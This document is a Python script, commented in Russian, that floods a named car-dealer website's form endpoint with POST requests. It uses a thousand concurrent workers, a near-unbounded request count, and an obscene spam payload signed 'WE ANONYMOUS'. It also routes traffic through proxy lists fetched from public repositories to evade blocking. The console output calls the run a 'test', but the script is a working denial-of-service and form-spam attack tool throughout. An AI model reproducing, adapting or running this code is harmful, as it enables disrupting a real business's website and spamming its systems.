import os
import asyncio
import aiohttp
import time
import random, string
import ssl
import sys
import time
import urllib.parse
import urllib.request
import uuid

from datetime import datetime, timezone

import aiohttp

from aiohttp_socks import ProxyConnector

TARGET_URL = "https://avto-trak.com" 

TOTAL_REQUESTS = 500000000000       # Общее количество запросов
DELAY_BETWEEN_REQ = 0.001      # Пауза перед отправкой следующего запроса в рамках воркера
MAX_CONCURRENT = 1000           # Количество параллельных воркеров (потоков)

iso_string = datetime.now(timezone.utc).isoformat(timespec='milliseconds').replace('+00:00', 'Z')
res = ''.join(random.choices(string.ascii_letters + string.digits, k=10))

payload = {
    "name": "WE ANONYMOUS " + res,
    "phone": "+79999999999",
    "email": "I_AM" + res +"@FUCK.YOU",
    "comment": "VIVA ANONYMOUS " * 20,
    "car": "Mitsubishi ASX - " + res,
    "source": "Карточка авто"
}

request_counter = 0
success_count = 0
fail_count = 0
counter_lock = asyncio.Lock()

class ProxyPool:
    def __init__(self):
        self.proxies = []
        self.lock = asyncio.Lock()
        self.is_enabled = False

    async def update_loop(self):
        """Фоновый цикл: обновляет список прокси каждые 7 минут"""
        urls = [
            "https://cdn.jsdelivr.net/gh/proxyscrape/free-proxy-list@main/proxies/all/data.txt",
            "https://raw.githubusercontent.com/komutan234/Proxy-List-Free/main/proxies/http.txt",
            "https://raw.githubusercontent.com/komutan234/Proxy-List-Free/main/proxies/socks5.txt"
        ]
        while True:
            for url in urls:
                try:
                    # Скачиваем пул асинхронно через run_in_executor, чтобы не блочить воркеры
                    loop = asyncio.get_running_loop()
                    def fetch():
                        with urllib.request.urlopen(url, timeout=15) as r:
                            return r.read().decode('utf-8')
                    
                    content = await loop.run_in_executor(None, fetch)
                    new_proxies = [line.strip() for line in content.splitlines() if line.strip()]
                    
                    if new_proxies:
                        async with self.lock:
                            self.proxies = new_proxies
                        print(f"\n[🔄 Пул обновлен] Загружено {len(self.proxies)} свежих прокси из внешнего источника.\n")
                        break
                except Exception as e:
                    print(f"[!] Ошибка обновления пула из {url.split('/')[2]}: {e}")
                    continue
            
            await asyncio.sleep(420)

    async def get_proxy(self):
        """Выдает случайный прокси из пула"""
        async with self.lock:
            if self.proxies:
                return random.choice(self.proxies)
            return None

    async def remove_proxy(self, proxy):
        """Удаляет тухлый прокси из актуального списка"""
        async with self.lock:
            if proxy in self.proxies:
                self.proxies.remove(proxy)
                print(f"[❌ Удален тухлый прокси] Осталось в пуле: {len(self.proxies)}")


PROXY_POOL = ProxyPool()


async def worker(worker_id):
    """Каждый воркер сам управляет своей сессией и своим прокси"""
    print(f"[*] Воркер {worker_id} запущен.")
    
    while True:
        current_proxy = await PROXY_POOL.get_proxy() if PROXY_POOL.is_enabled else None
        
        if current_proxy:
            proxy_url = current_proxy if "://" in current_proxy else f"http://{current_proxy}"
            connector = ProxyConnector.from_url(proxy_url, use_dns_cache=True, ttl_dns_cache=3)
        else:
            connector = aiohttp.TCPConnector(use_dns_cache=True, ttl_dns_cache=3)
      
        timeout = aiohttp.ClientTimeout(total=10) 
      
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            try:
                global request_counter, success_count, fail_count
    
                while True:
                    async with counter_lock:
                        if request_counter >= TOTAL_REQUESTS:
                            break
                        request_counter += 1
                        current_request_num = request_counter

                    try:
                        start_time = time.time()
                        async with session.post(TARGET_URL, json=payload, timeout=5, ssl=False) as response:
                            duration = time.time() - start_time
                            if response.status in (200, 201):
                                print(f"[+] Запрос {current_request_num} (Воркер {worker_id}): Успешно (Статус: {response.status}, Время: {duration:.3f}с)")
                                async with counter_lock: success_count += 1
                            else:
                                print(f"[-] Запрос {current_request_num} (Воркер {worker_id}): Сервер вернул код {response.status}")
                                async with counter_lock: fail_count += 1
                    except (aiohttp.ClientError, asyncio.TimeoutError) as e:
                        print(f"[!] Запрос {current_request_num} (Воркер {worker_id}): Ошибка соединения ({e})")
                        async with counter_lock: fail_count += 1

                    await asyncio.sleep(DELAY_BETWEEN_REQ)
                pass 
                
            except (aiohttp.ClientError, asyncio.TimeoutError) as e:
                if current_proxy:
                    await PROXY_POOL.remove_proxy(current_proxy)
                  
                await asyncio.sleep(1)
                continue 
              
            except Exception as e:
                await asyncio.sleep(1)
                continue

async def main():
    print(f"[*] Запуск асинхронного теста для: {TARGET_URL}")
    print(f"[*] Всего запросов: {TOTAL_REQUESTS}, Одновременных воркеров: {MAX_CONCURRENT}\n")
  
    if os.getenv("PROXY_URL"):
        PROXY_POOL.proxies = [os.getenv("PROXY_URL")]
        PROXY_POOL.is_enabled = True
        print("[*] Используется фиксированный прокси из Docker окружения.")
    elif len(sys.argv) > 1 and sys.argv[1].lower() == "proxy":
        PROXY_POOL.is_enabled = True
        asyncio.create_task(PROXY_POOL.update_loop())
        print("[*] Включен режим динамического пула прокси. Ожидание первой загрузки...")        
        while not PROXY_POOL.proxies:
            await asyncio.sleep(1)

    workers = [
        asyncio.create_task(worker(worker_id))
        for worker_id in range(1, MAX_CONCURRENT + 1)
    ]

    await asyncio.gather(*workers)

    print("\n--- Итоги тестирования ---")
    print(f"Успешных запросов: {success_count}")
    print(f"Ошибок/сбоев: {fail_count}")

if __name__ == "__main__":
    import sys
    if sys.platform == 'win32':
        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
        
    asyncio.run(main())
